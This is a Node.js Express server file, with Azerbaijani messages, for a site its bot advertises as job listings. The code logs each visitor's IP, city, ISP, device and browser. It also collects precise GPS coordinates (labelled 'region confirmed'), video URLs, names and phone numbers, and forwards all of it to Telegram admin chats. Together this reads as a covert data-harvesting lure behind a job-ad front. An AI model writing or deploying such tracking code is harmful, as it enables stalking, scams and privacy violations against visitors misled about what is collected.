// server.js
const express = require('express');
const path = require('path');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// ================== CONFIG ==================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_IDS = process.env.TELEGRAM_CHAT_IDS
  ? process.env.TELEGRAM_CHAT_IDS.split(',').map(id => id.trim())
  : [];

if (!TELEGRAM_BOT_TOKEN || TELEGRAM_CHAT_IDS.length === 0) {
  console.error('❌ Telegram token və ya chat ID-lər tapılmadı!');
} else {
  console.log('✅ Telegram hazırdır');
  console.log('👥 Adminlər:', TELEGRAM_CHAT_IDS);
}

// ================== MIDDLEWARE ==================
app.use(cors());
app.use(express.json({ limit: '50mb' }));

// ================== STATISTICS STORE ==================
const stats = {
  totalVisits: 0,
  uniqueIPs: new Set(),
  byCountry: {},
  byCity: {},
  byPath: {},
  byDevice: {},
  byBrowser: {},
  gpsReceived: 0,
  applications: 0,
  firstVisit: null,
  lastVisit: null,
  startedAt: new Date().toISOString(),
};

function detectDevice(ua = '') {
  if (/tablet|ipad/i.test(ua)) return 'Tablet';
  if (/mobile|android|iphone|ipod/i.test(ua)) return 'Mobile';
  return 'Desktop';
}

function detectBrowser(ua = '') {
  if (/edg/i.test(ua)) return 'Edge';
  if (/chrome|crios/i.test(ua)) return 'Chrome';
  if (/firefox|fxios/i.test(ua)) return 'Firefox';
  if (/safari/i.test(ua)) return 'Safari';
  if (/opera|opr/i.test(ua)) return 'Opera';
  return 'Other';
}

function topN(obj, n = 5) {
  return Object.entries(obj)
    .sort((a, b) => b[1] - a[1])
    .slice(0, n);
}

// ================== HELPERS ==================
function getClientIp(req) {
  const xf = req.headers['x-forwarded-for'];
  if (xf) return xf.split(',')[0].trim();
  return req.socket?.remoteAddress || 'unknown';
}

// ================== TELEGRAM SENDER ==================
async function sendToTelegram(text, chatIdOverride = null) {
  const targets = chatIdOverride ? [chatIdOverride] : TELEGRAM_CHAT_IDS;
  for (const chatId of targets) {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text,
          parse_mode: 'HTML',
        })
      });
    } catch (e) {
      console.error('Telegram göndərmə xətası:', e.message);
    }
  }
}

// ================== GEO HELPER ==================
async function getGeoInfo(ip) {
  try {
    const cleanIp = (ip || '').replace('::ffff:', '').split(',')[0].trim();

    if (
      !cleanIp ||
      cleanIp === 'unknown' ||
      cleanIp === '127.0.0.1' ||
      cleanIp === '::1' ||
      cleanIp.startsWith('192.168.') ||
      cleanIp.startsWith('10.') ||
      cleanIp.startsWith('172.')
    ) {
      return { country: 'Local', city: 'Local', isp: 'Local' };
    }

    const r = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,city,isp,query`);
    const data = await r.json();
    if (data.status === 'success') {
      return { country: data.country, city: data.city, isp: data.isp };
    }
    return {};
  } catch (e) {
    return {};
  }
}

// ================== STATS MESSAGE BUILDER ==================
function buildStatsMessage() {
  const lines = [];
  lines.push('📊 <b>STATİSTİKA</b>');
  lines.push('');
  lines.push(`👥 Ümumi ziyarət: <b>${stats.totalVisits}</b>`);
  lines.push(`🆔 Unikal IP: <b>${stats.uniqueIPs.size}</b>`);
  lines.push(`📍 GPS alındı: <b>${stats.gpsReceived}</b>`);
  lines.push(`📝 Müraciət: <b>${stats.applications}</b>`);
  lines.push('');

  const countries = topN(stats.byCountry, 5);
  if (countries.length) {
    lines.push('🌍 <b>Top ölkələr:</b>');
    countries.forEach(([k, v]) => lines.push(`   • ${k}: ${v}`));
    lines.push('');
  }

  const cities = topN(stats.byCity, 5);
  if (cities.length) {
    lines.push('🏙️ <b>Top şəhərlər:</b>');
    cities.forEach(([k, v]) => lines.push(`   • ${k}: ${v}`));
    lines.push('');
  }

  const devices = topN(stats.byDevice, 3);
  if (devices.length) {
    lines.push('📱 <b>Cihazlar:</b>');
    devices.forEach(([k, v]) => lines.push(`   • ${k}: ${v}`));
    lines.push('');
  }

  const browsers = topN(stats.byBrowser, 3);
  if (browsers.length) {
    lines.push('🌐 <b>Brauzerlər:</b>');
    browsers.forEach(([k, v]) => lines.push(`   • ${k}: ${v}`));
    lines.push('');
  }

  const paths = topN(stats.byPath, 5);
  if (paths.length) {
    lines.push('🔗 <b>Səhifələr:</b>');
    paths.forEach(([k, v]) => lines.push(`   • ${k}: ${v}`));
    lines.push('');
  }

  lines.push(`⏰ Son ziyarət: ${stats.lastVisit || '-'}`);
  lines.push(`🚀 Başlama: ${stats.startedAt}`);

  return lines.join('\n');
}

// ================== GLOBAL VISITOR LOGGER ==================
const loggedIPs = new Map();
const LOG_COOLDOWN_MS = 30000;

app.use(async (req, res, next) => {
  try {
    const isPageRequest =
      req.method === 'GET' &&
      !req.path.startsWith('/api/') &&
      !req.path.startsWith('/webhook/') &&
      !req.path.match(/\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|map|json)$/i);

    if (isPageRequest) {
      const ip = getClientIp(req);
      const now = Date.now();
      const ua = req.headers['user-agent'] || '';
      const lastSeen = loggedIPs.get(ip);

      // Statistika hər zaman yenilənir
      stats.totalVisits++;
      stats.uniqueIPs.add(ip);
      stats.byPath[req.path] = (stats.byPath[req.path] || 0) + 1;

      const device = detectDevice(ua);
      const browser = detectBrowser(ua);
      stats.byDevice[device] = (stats.byDevice[device] || 0) + 1;
      stats.byBrowser[browser] = (stats.byBrowser[browser] || 0) + 1;

      if (!stats.firstVisit) stats.firstVisit = new Date().toISOString();
      stats.lastVisit = new Date().toISOString();

      // Telegram-a yalnız cooldown-dan sonra göndər (spam qarşısı)
      if (!lastSeen || (now - lastSeen) > LOG_COOLDOWN_MS) {
        loggedIPs.set(ip, now);

        (async () => {
          const geo = await getGeoInfo(ip);

          if (geo.country && geo.country !== 'Local') {
            stats.byCountry[geo.country] = (stats.byCountry[geo.country] || 0) + 1;
            if (geo.city) {
              stats.byCity[geo.city] = (stats.byCity[geo.city] || 0) + 1;
            }
          }

          let msg = `🚨 <b>YENİ ZİYARƏTÇİ</b>\n`;
          msg += `🛰️ IP: <code>${ip}</code>\n`;
          if (geo.country && geo.country !== 'Local') {
            msg += `🌍 Ölkə: ${geo.country}\n`;
            if (geo.city) msg += `🏙️ Şəhər: ${geo.city}\n`;
            if (geo.isp) msg += `📡 ISP: ${geo.isp}\n`;
          } else {
            msg += `📍 Lokasiya: Local / bilinmir\n`;
          }
          msg += `📱 Cihaz: ${device}\n`;
          msg += `🌐 Brauzer: ${browser}\n`;
          msg += `🔗 Path: ${req.path}\n`;
          msg += `⏰ ${new Date().toISOString()}`;

          await sendToTelegram(msg.trim());
        })();
      }
    }
  } catch (e) {
    console.error('Visitor logger xətası:', e.message);
  }
  next();
});

// Statik fayllar
app.use(express.static(path.join(__dirname, 'public')));

// ================== API ==================
app.post('/api/send-data', async (req, res) => {
  try {
    const { videoUrl, location, action, name, phone } = req.body;

    const ip = getClientIp(req);

    // Statistika
    if (location?.latitude && location?.longitude) {
      stats.gpsReceived++;
    }
    if (action === 'apply') {
      stats.applications++;
    }

    let message = '';
    message += `🛰️ IP: <code>${ip}</code>\n`;

    if (action) {
      message += `🧩 Action: ${action}\n`;
    }

    if (name || phone) {
      message += `👤 Ad: ${name || 'yox'}\n`;
      message += `📞 Telefon: ${phone || 'yox'}\n`;
    }

    if (videoUrl) {
      message += `📹 Video URL: ${videoUrl}\n`;
    }

    if (location?.latitude && location?.longitude) {
      message += `📍 Region təsdiqləndi\n`;
      message += `🌍 ${location.latitude}, ${location.longitude}\n`;
      if (location.accuracy) message += `🎯 Dəqiqlik: ±${location.accuracy}m\n`;
    } else {
      message += `📍 Lokasiya yoxdur (icazə verilmədi)\n`;
    }

    const geo = await getGeoInfo(ip);
    if (geo.country && geo.country !== 'Local') {
      message += `🌐 Təxmini: ${geo.city || '?'}, ${geo.country}\n`;
    }

    await sendToTelegram(message.trim());
    res.json({ ok: true });

  } catch (err) {
    console.error('❌ API xətası:', err);
    res.status(500).json({ ok: false });
  }
});

// ================== TELEGRAM WEBHOOK ==================
app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, async (req, res) => {
  try {
    const msg = req.body.message;
    if (!msg || !msg.text) return res.sendStatus(200);

    const text = msg.text.trim();
    const fromChatId = msg.chat?.id;

    // Yalnız adminlərin əmrlərini qəbul et
    const isAdmin = TELEGRAM_CHAT_IDS.includes(String(fromChatId));

    if (text === '/start') {
      await sendToTelegram(
        `👋 Xoş gəldiniz!\n` +
        `📌 İş elanlarını görmək üçün keçid:\n` +
        `👉 https://video-analyzer-server.onrender.com\n\n` +
        `ℹ️ Məlumat üçün /about\n` +
        `📊 Statistika üçün /stats (yalnız admin)`,
        fromChatId
      );
    }

    else if (text === '/about') {
      await sendToTelegram(
        `ℹ️ Bu sistem yalnız test və daxili istifadə üçündür.\n` +
        `Daxil edilən məlumatlar adminə bildirilir.`,
        fromChatId
      );
    }

    else if (text === '/link') {
      await sendToTelegram(
        `🔗 https://video-analyzer-server.onrender.com`,
        fromChatId
      );
    }

    else if (text === '/stats') {
      if (!isAdmin) {
        await sendToTelegram('⛔ Bu əmr yalnız adminlər üçündür.', fromChatId);
      } else {
        await sendToTelegram(buildStatsMessage(), fromChatId);
      }
    }

    else if (text === '/reset_stats') {
      if (!isAdmin) {
        await sendToTelegram('⛔ Bu əmr yalnız adminlər üçündür.', fromChatId);
      } else {
        stats.totalVisits = 0;
        stats.uniqueIPs.clear();
        stats.byCountry = {};
        stats.byCity = {};
        stats.byPath = {};
        stats.byDevice = {};
        stats.byBrowser = {};
        stats.gpsReceived = 0;
        stats.applications = 0;
        stats.firstVisit = null;
        stats.lastVisit = null;
        stats.startedAt = new Date().toISOString();
        await sendToTelegram('✅ Statistika sıfırlandı.', fromChatId);
      }
    }

    res.sendStatus(200);
  } catch (e) {
    console.error('Webhook xətası:', e);
    res.sendStatus(200);
  }
});

// ================== FRONTEND (SPA fallback) ==================
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ================== START ==================
app.listen(PORT, () => {
  console.log(`🚀 Server ${PORT} portunda işləyir`);
});
